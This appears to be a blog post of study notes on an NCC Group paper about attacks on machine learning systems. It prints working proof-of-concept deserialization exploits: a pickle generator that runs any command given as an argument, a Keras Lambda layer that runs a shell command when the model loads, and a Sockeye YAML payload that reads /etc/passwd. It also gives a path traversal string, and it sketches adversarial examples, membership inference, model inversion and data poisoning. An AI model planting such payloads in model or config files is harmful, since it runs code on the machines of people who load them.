---
title: Machine Learning Attack
layout: post
categories: ML
tags: ML
date: 2022-07-14 08:00
excerpt: Machine Learning Attack
---

{:.table-of-content}
* TOC
{:toc}

# Machine Learning Attack
> https://research.nccgroup.com/wp-content/uploads/2022/07/practical-attacks-on-ml.pdf

## Library Attack

### path traversal
```
../../../../xxx
```

### pickle
> When the **Pickler** encounters an object of a type it knows nothing about — such as an extension type — it looks in two places for a hint of how to pickle it. One alternative is for the object to implement a **__reduce__()** method. If provided, at pickling time **__reduce__()** will be called with no arguments, and it must return either a string or a tuple.

- create malicious pkl file
```python
import pickle, sys
DEFAULT_COMMAND = 'echo You Are Hacked'
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))
with open("rs.pkl", "wb") as f:
    pickle.dump(PickleRce(), f)
```

- load pkl file
```python
import pickle
with open("rs.pkl", "rb") as f:
    obj = pickle.load(f)
```

### torch
> pickle manipulate tool: https://github.com/trailofbits/fickling

- use [pytorch_poc.py](/assets/py/pytorch_poc.py) to create malicious model file
```shell
python3 pytorch_poc.py
```

- load model
```python
import torch
torch.load("pytorch_exfil_poc.zip")
```

### numpy

- use previous created rs.pkl
- load it with numpy
```python
import numpy
numpy.load('rs.pkl', allow_pickle=True)
```

### keras
> use lambda layer to execute command 

- create h5 model file
```python
from keras.layers import Lambda
from keras.models import Input, Model
a = Input(shape=(2,))
b = Input(shape=(2,))
def exploit(inputs):
    import os
    os.system('echo "You Are Hacked !!!"')
    x, y = inputs
    return (x + y)
lambda_layer = Lambda(exploit, name="exploit")([a, b])
model = Model(inputs=[a, b], outputs=[lambda_layer])
model.save("my_model.h5")
```

- load model file
```python
from keras.models import load_model
load_model("my_model.h5")
```

### Sockeye
> reference: https://github.com/s-index/CVE-2021-43811

- create malious yaml
```
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('cat /etc/passwd')"
```

- load config
```
from sockeye.config import Config
c = Config()
c.load('./malicious.yml')
```

### TensorFlow Server unauthorized access
> For performance reasons, the default TensorFlow server does not include any authorization protocol and sends messages unencrypted. It accepts connections from anywhere, and executes the graphs it is sent without performing any checks.”

#### Apache MXNet
> This text is taken from the Apache MXNet documentation at https://mxnet.apache.org/versions/1.0.0/how_to/security.html

- In particular the following threat-vectors exist when training using MXNet:
- When running distributed training using MXNet there is no built-in support for authenticating cluster nodes participating in the training job.
- Data exchange between cluster nodes happens is in plain-text.
- Using kvstore.set_optimizer one can use a custom optimizer to combine gradients. This optimizer code is sent to the server nodes as a pickle file. A server does not perform any further validation of the pickle file and simply executes the code trusting the sender (worker).
- Since there is no authentication between nodes, a malicious actor running on the same network can launch a Denial of Service (DoS) attack by sending data that can overwhelm/crash a scheduler or other server nodes.

## Reproduced Results from ML Attack Literature

### Misclassification via Blackbox method
A pseudocode description of the algorithm is as follows. In this case we are choosing "confidence in class Y" as our objective, and transforming an image that classifies as “X” into an image with >= 99% confidence in class "Y"
```
base_image = input
current_confidence = confidence_in_class_Y( base_image )
while current_confidence < 99%
	done = false
	noise_proportion = 5%
	while noise_proportion > 0.0001%
		for i = 1 to 4
			perturbed_image = add_random_noise(base_image, noise_proportion)
			new_confidence = confidence_in_class_Y( perturbed_image )
			if( new_confidence > current_confidence )
				base_image = perturbed_image
				done = true
			if done then break
	if done then break
	noise_proportion = noise_proportion / 2
```

### Membership Inference
> https://www.cs.cornell.edu/~shmat/shmat_oak17.pdf

A Membership Inference attack allows the attacker to determine if some input formed part of the training set of the model, simply by exercising the trained model on chosen inputs and observing the result.

- Train a number of "Shadow Models"
using similar data to the data used to train the Target Model. Note that the attacker doesn’t need to have access to the Target Model’s training data; they simply need to gather data that is similarly distributed and which has a similar structure, i.e. data from the same problem domain.

- Train an "Attack Model"
A binary classifier with two output classes; "In Training Set" and "Not In Training Set". The Attack Model is trained to recognise the statistical indicators of data that was present in the shadow training set, versus data that was not. Because the Shadow Models and the Target Model were trained on similarly distributed data from the same problem domain, it turns out that the Attack Model is able to recognise these statistical “in/out” indicators in the Target Model with a surprisingly high degree of accuracy.

### Model Inversion
> https://dl.acm.org/doi/pdf/10.1145/2810103.2813677、https://arxiv.org/pdf/1910.04257.pdf

A Model Inversion attack allows sensitive data in the training set to be obtained by an attacker, by supplying inputs and noting the corresponding output.

#### Fredrikson2015

The Target Model is trained on two classes of signature. The objective of the attack is to obtain a legible image of the target signature, by means of a constrained hill-climbing algorithm. The assumed scenario is an inference attack, in which the attacker can submit inputs and observe outputs, but in which the attacker does not have direct local access to the trained model. Of course, if the attacker did have access to the trained model, it would be much more efficient to use a local analysis technique, observing the model parameters directly.<br>
The exploit script starts with an image of a known signature, and uses a simple hill climbing algorithm to modify the signature to maximise confidence in the target class, gradually modifying the input image so that it drifts toward a representation of the target signature. This is very similar to the simple technique used to generate adversarially perturbed images; the main difference is that in our model inversion exploit, we constrain the image to look like a signature. This corrects the tendency of the algorithm to include "adversarial artefacts" or dissolve into noise and ensures that the resulting image gravitates toward the target signature.

### Data Poisoning
> https://arxiv.org/pdf/1712.05526.pdf

A data poisoning backdoor attack on a classifier involves inserting specific items into the training data of a system to cause it to respond in some manner desirable to an attacker. 

## Traditional Hacking Techniques Applied to ML Systems

### Credentials in Code
Finding secret in code:
- <https://github.com/chris-anley/ccs>
- <https://github.com/awslabs/git-secrets>
- <https://github.com/dxa4481/truffleHog>
- <https://github.com/techjacker/repo-security-scanner>
- <https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning>

### Dependencies
Third-party libraries may introduces a series of security problems:
- supplychain attack: <https://github.com/ffffffff0x/Dork-Admin>
- vulnerabilities: CVE-2021-32798、CVE-2022-21697、CVE-2022-24758、etc...

### Web Application Issues
- SQL Injection
- XSS
- SSRF

